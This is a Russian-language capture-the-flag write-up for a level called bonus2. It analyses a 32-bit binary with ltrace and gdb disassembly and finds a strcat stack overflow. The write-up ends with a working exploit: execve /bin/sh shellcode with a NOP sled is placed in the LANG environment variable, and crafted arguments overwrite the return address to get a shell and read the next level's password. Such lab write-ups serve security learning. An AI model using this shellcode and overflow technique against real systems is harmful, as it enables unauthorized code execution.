# su bonus2
# pass: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

====
Уязвимость: переполнение, вызов шеллкода из глобальной переменной
====

**Поведение: При запуске без аргументов - ничего, нужно 2 аргумента. Программа печатает приветствие с первым аргументом.**

# ltrace ./bonus2 
__libc_start_main(0x8048529, 1, 0xbffff804, 0x8048640, 0x80486b0 <unfinished ...>
+++ exited (status 1) +++

# ltrace ./bonus2 1 3
__libc_start_main(0x8048529, 3, 0xbffff7f4, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(0xbffff6f0, "1", 40)                                                   = 0xbffff6f0
strncpy(0xbffff718, "3", 32)                                                   = 0xbffff718
getenv("LANG")                                                                 = "en_US.UTF-8"
memcmp(0xbfffff1f, 0x804873d, 2, 0xb7fff918, 0)                                = -1
memcmp(0xbfffff1f, 0x8048740, 2, 0xb7fff918, 0)                                = -1
strcat("Hello ", "1")                                                          = "Hello 1"
puts("Hello 1"Hello 1
)                                                                = 8
+++ exited (status 8) +++

Проверяем возможные функции - существуют main и greetuser

# i func
<>
0x08048484  greetuser
0x08048529  main
<>

А также глобальная переменная language

# i var
<>
0x08049988  language

# x/a 0x08049988
0x8049988 <language>:   0x0

По мейну проверяется, что есть два аргумента, затем делается мемсет и копируется информация аргументов, проверяется LANG и если fi, то в гл.перем. пойдет 1, если nl - то 2, в остальном = 0. Затем вызов greetuser

# disas main
Dump of assembler code for function main:
   0x08048529 <+0>:     push   %ebp
   0x0804852a <+1>:     mov    %esp,%ebp
   0x0804852c <+3>:     push   %edi
   0x0804852d <+4>:     push   %esi
   0x0804852e <+5>:     push   %ebx
   0x0804852f <+6>:     and    $0xfffffff0,%esp
   0x08048532 <+9>:     sub    $0xa0,%esp                   160
   0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp)               3
   0x0804853c <+19>:    je     0x8048548 <main+31>          ==
   0x0804853e <+21>:    mov    $0x1,%eax
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
   0x08048548 <+31>:    lea    0x50(%esp),%ebx              80
   0x0804854c <+35>:    mov    $0x0,%eax                    0
   0x08048551 <+40>:    mov    $0x13,%edx                   19
   0x08048556 <+45>:    mov    %ebx,%edi
   0x08048558 <+47>:    mov    %edx,%ecx
   0x0804855a <+49>:    rep stos %eax,%es:(%edi)
   0x0804855c <+51>:    mov    0xc(%ebp),%eax               12
   0x0804855f <+54>:    add    $0x4,%eax                    4
   0x08048562 <+57>:    mov    (%eax),%eax
   0x08048564 <+59>:    movl   $0x28,0x8(%esp)              40
   0x0804856c <+67>:    mov    %eax,0x4(%esp)               4
   0x08048570 <+71>:    lea    0x50(%esp),%eax              80
   0x08048574 <+75>:    mov    %eax,(%esp)
   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:    mov    0xc(%ebp),%eax
   0x0804857f <+86>:    add    $0x8,%eax
   0x08048582 <+89>:    mov    (%eax),%eax
   0x08048584 <+91>:    movl   $0x20,0x8(%esp)                 32
   0x0804858c <+99>:    mov    %eax,0x4(%esp)
   0x08048590 <+103>:   lea    0x50(%esp),%eax                 80
   0x08048594 <+107>:   add    $0x28,%eax                      40
   0x08048597 <+110>:   mov    %eax,(%esp)
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:   movl   $0x8048738,(%esp)                "LANG"
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
   0x080485ab <+130>:   mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:   cmpl   $0x0,0x9c(%esp)                  0
   0x080485ba <+145>:   je     0x8048618 <main+239>
   0x080485bc <+147>:   movl   $0x2,0x8(%esp)                   2
   0x080485c4 <+155>:   movl   $0x804873d,0x4(%esp)             "fi"
   0x080485cc <+163>:   mov    0x9c(%esp),%eax
   0x080485d3 <+170>:   mov    %eax,(%esp)
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
   0x080485db <+178>:   test   %eax,%eax
   0x080485dd <+180>:   jne    0x80485eb <main+194>
   0x080485df <+182>:   movl   $0x1,0x8049988                   <language> = 1
   0x080485e9 <+192>:   jmp    0x8048618 <main+239>
   0x080485eb <+194>:   movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:   movl   $0x8048740,0x4(%esp)             "nl"
   0x080485fb <+210>:   mov    0x9c(%esp),%eax
   0x08048602 <+217>:   mov    %eax,(%esp)
   0x08048605 <+220>:   call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:   test   %eax,%eax
   0x0804860c <+227>:   jne    0x8048618 <main+239>
   0x0804860e <+229>:   movl   $0x2,0x8049988                   <language> = 2
   0x08048618 <+239>:   mov    %esp,%edx
   0x0804861a <+241>:   lea    0x50(%esp),%ebx
   0x0804861e <+245>:   mov    $0x13,%eax                   19
   0x08048623 <+250>:   mov    %edx,%edi
   0x08048625 <+252>:   mov    %ebx,%esi
   0x08048627 <+254>:   mov    %eax,%ecx
   0x08048629 <+256>:   rep movsl %ds:(%esi),%es:(%edi)
   0x0804862b <+258>:   call   0x8048484 <greetuser>
   0x08048630 <+263>:   lea    -0xc(%ebp),%esp
   0x08048633 <+266>:   pop    %ebx
   0x08048634 <+267>:   pop    %esi
   0x08048635 <+268>:   pop    %edi
   0x08048636 <+269>:   pop    %ebp
   0x08048637 <+270>:   ret    
End of assembler dump.

В greetuser в зависимости от глоб.перем. выбирается строка с приветствием, затем стркатом соединяется с 1 аргументом, выводится.

# disas 0x8048484
Dump of assembler code for function greetuser:
   0x08048484 <+0>:     push   %ebp
   0x08048485 <+1>:     mov    %esp,%ebp
   0x08048487 <+3>:     sub    $0x58,%esp                           88
   0x0804848a <+6>:     mov    0x8049988,%eax                       <language>
   0x0804848f <+11>:    cmp    $0x1,%eax                            1
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    $0x2,%eax                            2
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:    test   %eax,%eax
   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
   0x0804849d <+25>:    mov    $0x8048710,%edx                      "Hello "
   0x080484a2 <+30>:    lea    -0x48(%ebp),%eax                     -72
   0x080484a5 <+33>:    mov    (%edx),%ecx
   0x080484a7 <+35>:    mov    %ecx,(%eax)
   0x080484a9 <+37>:    movzwl 0x4(%edx),%ecx
   0x080484ad <+41>:    mov    %cx,0x4(%eax)
   0x080484b1 <+45>:    movzbl 0x6(%edx),%edx
   0x080484b5 <+49>:    mov    %dl,0x6(%eax)
   0x080484b8 <+52>:    jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:    mov    $0x8048717,%edx                      "Hyvää päivää "
   0x080484bf <+59>:    lea    -0x48(%ebp),%eax
   0x080484c2 <+62>:    mov    (%edx),%ecx
   0x080484c4 <+64>:    mov    %ecx,(%eax)
   0x080484c6 <+66>:    mov    0x4(%edx),%ecx
   0x080484c9 <+69>:    mov    %ecx,0x4(%eax)
   0x080484cc <+72>:    mov    0x8(%edx),%ecx
   0x080484cf <+75>:    mov    %ecx,0x8(%eax)
   0x080484d2 <+78>:    mov    0xc(%edx),%ecx
   0x080484d5 <+81>:    mov    %ecx,0xc(%eax)
   0x080484d8 <+84>:    movzwl 0x10(%edx),%ecx                    Word (16-bit) to Long (32-bit)
   0x080484dc <+88>:    mov    %cx,0x10(%eax)
   0x080484e0 <+92>:    movzbl 0x12(%edx),%edx                    Byte (8-bit) to Word (16-bit)
   0x080484e4 <+96>:    mov    %dl,0x12(%eax)
   0x080484e7 <+99>:    jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:   mov    $0x804872a,%edx                     "Goedemiddag! "
   0x080484ee <+106>:   lea    -0x48(%ebp),%eax
   0x080484f1 <+109>:   mov    (%edx),%ecx
   0x080484f3 <+111>:   mov    %ecx,(%eax)
   0x080484f5 <+113>:   mov    0x4(%edx),%ecx
   0x080484f8 <+116>:   mov    %ecx,0x4(%eax)
   0x080484fb <+119>:   mov    0x8(%edx),%ecx
   0x080484fe <+122>:   mov    %ecx,0x8(%eax)
   0x08048501 <+125>:   movzwl 0xc(%edx),%edx               12
   0x08048505 <+129>:   mov    %dx,0xc(%eax)
   0x08048509 <+133>:   nop
   0x0804850a <+134>:   lea    0x8(%ebp),%eax               8        
   0x0804850d <+137>:   mov    %eax,0x4(%esp)               4
   0x08048511 <+141>:   lea    -0x48(%ebp),%eax             72
   0x08048514 <+144>:   mov    %eax,(%esp)
   0x08048517 <+147>:   call   0x8048370 <strcat@plt>
   0x0804851c <+152>:   lea    -0x48(%ebp),%eax             72
   0x0804851f <+155>:   mov    %eax,(%esp)
   0x08048522 <+158>:   call   0x8048390 <puts@plt>
   0x08048527 <+163>:   leave  
   0x08048528 <+164>:   ret    
End of assembler dump.

0x28 + 0x20
Аргументы также идут друг за другом.
Суть в том, что из-за того, что 1 строка = 40, а 2 = 32, мы не дойдем до офсета с дефолтным языком.

The strcat() and strncat() functions append a copy of the null-terminated string s2 to the end of the null-terminated string s1, then add a terminating `\0'.  The string s1 must have sufficient space to hold the result.

Попробуем сменить язык и найти оффсет.

# export LANG="nl"

# run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A

0x38614137 = 8aA7 -> 23 оффсет

# export LANG="fi"

# run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A

0x41366141 = A6aA -> 18

Видим, что поменяв язык, наши дефолтные строки изменятся, соответственно, оффсет для fi = 18, для nl = 23.
Этого хватит для перезаписи адреса возврата.

Так как здесь нигде не вызывается шелл, систем или что-то подобное, необходимо будет вставить свой шеллкод.
Глобальная переменная будет хранить язык (так как сравнивается первые 2 буквы), затем ноп-коды и шеллкод.

# export LANG=$(python -c 'print("nl" + "\x90" * 150 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')

# ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\xe6\xfe\xff\xbf"') 

# export LANG=$(python -c 'print("fi" + "\x90" * 150 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')

# ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 18 + "\xe6\xfe\xff\xbf"')

# cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587